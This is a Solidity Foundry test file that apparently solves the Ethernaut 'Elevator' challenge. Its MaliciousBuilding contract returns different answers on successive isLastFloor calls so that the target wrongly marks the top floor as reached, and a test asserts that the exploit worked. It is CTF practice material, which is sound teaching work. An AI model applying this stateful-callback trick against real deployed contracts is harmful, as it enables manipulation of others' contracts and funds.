// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Elevator} from "../src/Elevator.sol";
import {console} from "forge-std/console.sol";

contract MaliciousBuilding {
    bool private firstCall = true;
    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }
        return true;
    }

    function attack(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}

contract ElevatorTest is Test {
    Elevator public elevator;
    MaliciousBuilding public attacker;

    function setUp() public {
        elevator = new Elevator();
        attacker = new MaliciousBuilding(address(elevator));
    }

    function testExploit() public {
        uint256 targetFloor = 10;

        // Get and log initial state
        uint256 initialFloor = elevator.floor();
        console.log("Initial floor position:", initialFloor);

        // Execute attack
        attacker.attack(targetFloor);

        // Get and log final state
        uint256 finalFloor = elevator.floor();
        console.log("Final floor position:", finalFloor);

        // Verify results
        assertTrue(elevator.top(), "Elevator should be at top");
        assertEq(finalFloor, targetFloor, "Floor should be updated");
    }
}
